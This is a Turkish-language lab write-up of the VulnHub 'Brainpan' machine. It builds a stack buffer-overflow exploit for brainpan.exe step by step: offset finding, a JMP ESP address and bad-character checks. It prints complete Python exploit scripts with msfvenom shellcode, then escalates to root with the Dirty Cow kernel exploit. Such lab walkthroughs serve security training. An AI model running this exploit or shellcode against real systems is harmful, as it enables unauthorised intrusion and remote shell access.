---
layout: post
title: "Brainpan Writeup"
date: 2019-06-28
excerpt: "28 Jun 2019"
comments: false
---

Uzun bir aradan sonra Brainpan zafiyetli makinasının çözümünü yazacağım. Root olmaya giden yolda Buffer Overflow zafiyeti barındıran bir programın exploit edilmesi gerektiğinden bu konuyada uzun uzadıya değineceğim. Brainpan imajına [bu linkten](https://www.vulnhub.com/entry/brainpan-1,51/) ulaşabilirsiniz. 

Hızlı bir nmap taraması ile başlıyoruz.

<figure >
    <img src="/assets/img/brainpan1.png">
</figure>

Alışılmışın dışında 9999. ve 10000. portlar açık. HTTP servisine yöneliyoruz. Görünürde olan statik bir HTML sayfası.

<figure >
    <img src="/assets/img/brainpan2.png">
</figure>

Fuzzing sonucu keşfettiğimiz bin/ dizinini ziyaret ediyoruz.

<figure >
    <img src="/assets/img/brainpan3.png">
</figure>

Dosyayı indirip Windows işletim sistemi üzerinde çalıştırdığımızda, 9999. port üzerinden dinleme yaptığını görüyoruz. Hedef makinanın 9999. portu üzerinde çalışan uygulamanın brainpan.exe olma ihtimali yüksek. 

<figure >
    <img src="/assets/img/brainpan5.jpeg">
</figure>

Hedef makina ile 9999 portu üzerinden bağlantı kuruyoruz.

<figure >
    <img src="/assets/img/brainpan4.png">
</figure>

Uygulamanın kullanıcıdan input alıyor olması ve ve statik analizde karşılaşılan strcpy gibi fonksiyonlar ilk olarak buffer overflow zafiyetini hatırlatıyor. Daha ayrıntılı incelemeye Windows 7 işletim sistemi üzerinde devam ediyoruz. 


Uygulamayı Immunity Debugger içerisinde açıp, çalıştırıyoruz. 

<figure >
    <img src="/assets/img/brainpan6.PNG">
</figure>

Öncelikle bir overflow olup olmadığını tespit ediyoruz. Bunun için başlangıç olarak 1000 karakter boyutunda bir input gönderiyoruz.

{% highlight python %}

#!/usr/bin/python

import socket
import sys

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('172.16.198.146',9999))

buffer="A"*1000

s.recv(1024)
s.send(buffer)

{% endhighlight %}

<figure >
    <img src="/assets/img/brainpan7.PNG">
</figure>

EIP üzerine, yani sıradaki komutu işaret eden pointer üzerine göndermiş olduğumuz A karakterleri basılmış. Anlıyoruz ki bir overflow durumu var. 

Burdan sonra yapılması gerekenler sırasıyla şu şekilde:

+ Overflow'un gerçekleştiği sınırı belirlemek.
+ Uygulama içerisinde bizi stack'e yönlendirecek adresi bulmak. 
+ Kodumuzun yürütülmesine engel olan karakterleri (badchar) belirlemek.
+ Stack'e uygun shellcode'u yerleştirmek.

Overflow'un gerçekleştiği sınırı bulmak için, 1000 adet A göndermek yerine 1000 byte boyutunda bir pattern gönderiyoruz. Daha sonra EIP üzerine yazılan değerden yola çıkarak buffer boyutunu öğrenmiş oluyoruz. Bunun için metasploit içerisinde bulunan pattern_create ve pattern_offset scriptlerini kullanacağız.

1000 byte boyutunda ki patternimizi oluşturuyoruz.

<figure >
    <img src="/assets/img/brainpan8.png">
</figure>

{% highlight python %}

#!/usr/bin/python

import socket
import sys

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('172.16.198.146',9999))

buffer="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

s.recv(1024)
s.send(buffer)

{% endhighlight %}

<figure >
    <img src="/assets/img/brainpan9.PNG">
</figure>

EIP üzerine yazılan değer "35724134" şeklinde.

<figure >
    <img src="/assets/img/brainpan10.png">
</figure>

pattern_offset scriptini kullanarak bu değerin 524 byte'a karşılık geldiğini öğreniyoruz. Yani bufferın boyutu 524 byte.

Doğrulamak adına bu kez 524 adet A, buna ek olarakta 4 adet B karakteri gönderiyoruz. Böylece EIP üzerinde 42424242 değerini görmeyi bekliyoruz.

{% highlight python %}

#!/usr/bin/python

import socket
import sys

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('172.16.198.146',9999))

buffer="A"*524 + "BBBB"  + "ABCDEFGHJKLMNO123456789abcdefghijklmn"

s.recv(1024)
s.send(buffer)

{% endhighlight %}

<figure >
    <img src="/assets/img/brainpan11.PNG">
</figure>

EIP üzerine 42424242 değeri yazıldı. Anlıyoruz ki offset hesabımız doğru. Bir diğer kontrol ettiğimiz şey de stack'e atlamadan önce arada kaç karakterin kaybolduğuydu. Ama görüyoruz ki BBBB karakterlerinden sonra yazdığımız karakter dizisi aynen basılmış. Yani herhangi bir kayıp yok. 

Sıra geldi bizi stack'e yönlendirecek olan adresi bulmaya. Bunun için Immunity Debugger üzerinde View > Executable Modules menüsünden uygulamanın çalıştırdığı DLL'lere bakıyoruz. Herhangi bir tanesine çift tıklayıp o dll içerisinde JMP ESP komutunu arıyoruz. Herhangi bir dll  yerine uygulamanın içinde de JMP ESP komutunu arayabiliriz. 

<figure >
    <img src="/assets/img/brainpan12.PNG">
</figure>

Bulduğumuz 311712F3 adresini Little Endian'a uygun bir şekilde yani tersten olarak EIP üzerine yazmak üzere not ediyoruz. Son olarak badchar'ları buluyoruz.

{% highlight python %}
#!/usr/bin/python

import socket
import sys

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('172.16.198.146',9999))


badchar = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


buffer="A"*524 + "BBBB"  + "\x90"*10 + badchar

s.recv(1024)
s.send(buffer)

{% endhighlight %}

Bu kod parçası ile 1-255 arasındaki hex karakterleri stack'e yazıyoruz. Karakterlerden hangisinin veya hangilerinin akışı bozduğuna bakacağız. \x00 karakteri çoğu uygulamada badchar'dır.Bizde bu uygulama için badchar olarak kabul ediyoruz. 

ESP üzerinde Follow in Dump diyerek akışın devam ettiği noktaya gidiyoruz.

<figure >
    <img src="/assets/img/brainpan13.PNG">
</figure>

Görüldüğü üzere 1-255 hex karakterleri arasında akışı bozan yok. Badchar olarak yalnızca \x00 karakterini kabul ediyoruz.

Son olarak shellcode'umuzu oluşturuyoruz. Bunun için msfvenom kullanmayı tercih ediyoruz. 

<figure >
    <img src="/assets/img/brainpan14.png">
</figure>

Exploitimizin en son hali bu şekilde.


{% highlight python %}


#!/usr/bin/python

import socket
import sys

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('172.16.198.146',9999))


buf =  ""
buf += "\xd9\xed\xd9\x74\x24\xf4\x58\xbb\x4a\x60\xda\xe7\x29"
buf += "\xc9\xb1\x52\x31\x58\x17\x03\x58\x17\x83\xa2\x9c\x38"
buf += "\x12\xce\xb5\x3f\xdd\x2e\x46\x20\x57\xcb\x77\x60\x03"
buf += "\x98\x28\x50\x47\xcc\xc4\x1b\x05\xe4\x5f\x69\x82\x0b"
buf += "\xd7\xc4\xf4\x22\xe8\x75\xc4\x25\x6a\x84\x19\x85\x53"
buf += "\x47\x6c\xc4\x94\xba\x9d\x94\x4d\xb0\x30\x08\xf9\x8c"
buf += "\x88\xa3\xb1\x01\x89\x50\x01\x23\xb8\xc7\x19\x7a\x1a"
buf += "\xe6\xce\xf6\x13\xf0\x13\x32\xed\x8b\xe0\xc8\xec\x5d"
buf += "\x39\x30\x42\xa0\xf5\xc3\x9a\xe5\x32\x3c\xe9\x1f\x41"
buf += "\xc1\xea\xe4\x3b\x1d\x7e\xfe\x9c\xd6\xd8\xda\x1d\x3a"
buf += "\xbe\xa9\x12\xf7\xb4\xf5\x36\x06\x18\x8e\x43\x83\x9f"
buf += "\x40\xc2\xd7\xbb\x44\x8e\x8c\xa2\xdd\x6a\x62\xda\x3d"
buf += "\xd5\xdb\x7e\x36\xf8\x08\xf3\x15\x95\xfd\x3e\xa5\x65"
buf += "\x6a\x48\xd6\x57\x35\xe2\x70\xd4\xbe\x2c\x87\x1b\x95"
buf += "\x89\x17\xe2\x16\xea\x3e\x21\x42\xba\x28\x80\xeb\x51"
buf += "\xa8\x2d\x3e\xf5\xf8\x81\x91\xb6\xa8\x61\x42\x5f\xa2"
buf += "\x6d\xbd\x7f\xcd\xa7\xd6\xea\x34\x20\x75\xfa\xf0\x25"
buf += "\xed\xf9\xfc\x54\xb2\x74\x1a\x3c\x5a\xd1\xb5\xa9\xc3"
buf += "\x78\x4d\x4b\x0b\x57\x28\x4b\x87\x54\xcd\x02\x60\x10"
buf += "\xdd\xf3\x80\x6f\xbf\x52\x9e\x45\xd7\x39\x0d\x02\x27"
buf += "\x37\x2e\x9d\x70\x10\x80\xd4\x14\x8c\xbb\x4e\x0a\x4d"
buf += "\x5d\xa8\x8e\x8a\x9e\x37\x0f\x5e\x9a\x13\x1f\xa6\x23"
buf += "\x18\x4b\x76\x72\xf6\x25\x30\x2c\xb8\x9f\xea\x83\x12"
buf += "\x77\x6a\xe8\xa4\x01\x73\x25\x53\xed\xc2\x90\x22\x12"
buf += "\xea\x74\xa3\x6b\x16\xe5\x4c\xa6\x92\x15\x07\xea\xb3"
buf += "\xbd\xce\x7f\x86\xa3\xf0\xaa\xc5\xdd\x72\x5e\xb6\x19"
buf += "\x6a\x2b\xb3\x66\x2c\xc0\xc9\xf7\xd9\xe6\x7e\xf7\xcb"


buffer="A"*524 + "\xF3\x12\x17\x31"  + "\x90"*10 + buf

s.recv(1024)
s.send(buffer)
{% endhighlight %}

<figure >
    <img src="/assets/img/brainpan15.png">
</figure>

Stack'e atlarken arada bir boşluk oluşmuyor demiştik. Buna rağmen işimizi sağlama almak adına 10 adet \x90 yani NOP karakteri bastık. 

Şimdi son olarak exploitimizi hedef makinamız için düzenliyoruz. 


{% highlight python %}

#!/usr/bin/python

import socket
import sys

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('172.16.198.140',9999))


buf =  ""
buf += "\xd9\xed\xd9\x74\x24\xf4\x58\xbb\x4a\x60\xda\xe7\x29"
buf += "\xc9\xb1\x52\x31\x58\x17\x03\x58\x17\x83\xa2\x9c\x38"
buf += "\x12\xce\xb5\x3f\xdd\x2e\x46\x20\x57\xcb\x77\x60\x03"
buf += "\x98\x28\x50\x47\xcc\xc4\x1b\x05\xe4\x5f\x69\x82\x0b"
buf += "\xd7\xc4\xf4\x22\xe8\x75\xc4\x25\x6a\x84\x19\x85\x53"
buf += "\x47\x6c\xc4\x94\xba\x9d\x94\x4d\xb0\x30\x08\xf9\x8c"
buf += "\x88\xa3\xb1\x01\x89\x50\x01\x23\xb8\xc7\x19\x7a\x1a"
buf += "\xe6\xce\xf6\x13\xf0\x13\x32\xed\x8b\xe0\xc8\xec\x5d"
buf += "\x39\x30\x42\xa0\xf5\xc3\x9a\xe5\x32\x3c\xe9\x1f\x41"
buf += "\xc1\xea\xe4\x3b\x1d\x7e\xfe\x9c\xd6\xd8\xda\x1d\x3a"
buf += "\xbe\xa9\x12\xf7\xb4\xf5\x36\x06\x18\x8e\x43\x83\x9f"
buf += "\x40\xc2\xd7\xbb\x44\x8e\x8c\xa2\xdd\x6a\x62\xda\x3d"
buf += "\xd5\xdb\x7e\x36\xf8\x08\xf3\x15\x95\xfd\x3e\xa5\x65"
buf += "\x6a\x48\xd6\x57\x35\xe2\x70\xd4\xbe\x2c\x87\x1b\x95"
buf += "\x89\x17\xe2\x16\xea\x3e\x21\x42\xba\x28\x80\xeb\x51"
buf += "\xa8\x2d\x3e\xf5\xf8\x81\x91\xb6\xa8\x61\x42\x5f\xa2"
buf += "\x6d\xbd\x7f\xcd\xa7\xd6\xea\x34\x20\x75\xfa\xf0\x25"
buf += "\xed\xf9\xfc\x54\xb2\x74\x1a\x3c\x5a\xd1\xb5\xa9\xc3"
buf += "\x78\x4d\x4b\x0b\x57\x28\x4b\x87\x54\xcd\x02\x60\x10"
buf += "\xdd\xf3\x80\x6f\xbf\x52\x9e\x45\xd7\x39\x0d\x02\x27"
buf += "\x37\x2e\x9d\x70\x10\x80\xd4\x14\x8c\xbb\x4e\x0a\x4d"
buf += "\x5d\xa8\x8e\x8a\x9e\x37\x0f\x5e\x9a\x13\x1f\xa6\x23"
buf += "\x18\x4b\x76\x72\xf6\x25\x30\x2c\xb8\x9f\xea\x83\x12"
buf += "\x77\x6a\xe8\xa4\x01\x73\x25\x53\xed\xc2\x90\x22\x12"
buf += "\xea\x74\xa3\x6b\x16\xe5\x4c\xa6\x92\x15\x07\xea\xb3"
buf += "\xbd\xce\x7f\x86\xa3\xf0\xaa\xc5\xdd\x72\x5e\xb6\x19"
buf += "\x6a\x2b\xb3\x66\x2c\xc0\xc9\xf7\xd9\xe6\x7e\xf7\xcb"

buffer="A"*524 + "\xF3\x12\x17\x31"  + "\x90"*10 + buf

s.recv(1024)
s.send(buffer)

{% endhighlight %}

<figure >
    <img src="/assets/img/brainpan16.png">
</figure>

Buffer overflow kısmının sonuna geldik. Burdan sonra yetkilerimizi root haklarına yükseltmek için uğraşıyoruz.

Aldığımız shellin çok kullanışlı olmaması sebebiyle, eli yüzü daha düzgün olan meterpreter shell'e geçiyoruz.

<figure >
    <img src="/assets/img/brainpan17.png">
</figure>

<figure >
    <img src="/assets/img/brainpan18.png">
</figure>

Burdan sonra ilk olarak çekirdek versiyonunu kontrol ediyoruz.

<figure >
    <img src="/assets/img/brainpan19.png">
</figure>

Bu çekirdek versiyonu için birden fazla exploit mevcut. Ama ilk olarak genelde şaşmayan 
 [Dirty Cow](https://www.exploit-db.com/exploits/40839) exploitini deneyeceğiz ki içeride gcc yok.

<figure >
    <img src="/assets/img/brainpan20.png">
</figure>

Bu sebeple kendi hostumuzda derleyip hedef makinaya gönderiyoruz. 

<figure >
    <img src="/assets/img/brainpan21.png">
</figure>

<figure >
    <img src="/assets/img/brainpan22.png">
</figure>

Exploit başarılı olduğu taktirde, sistemde root haklarına sahip firefart adında bir kullanıcı oluşturuyor. 
 
<figure >
    <img src="/assets/img/brainpan23.png">
</figure>

Hedef makinamızda da başarılı oldu. Böylece root haklarına sahip bir kullanıcıya geçiş yaptık. 

Uzun ve yorucu bir yazı oldu :) Yeni bir writeup'da görüşmek üzere ! 
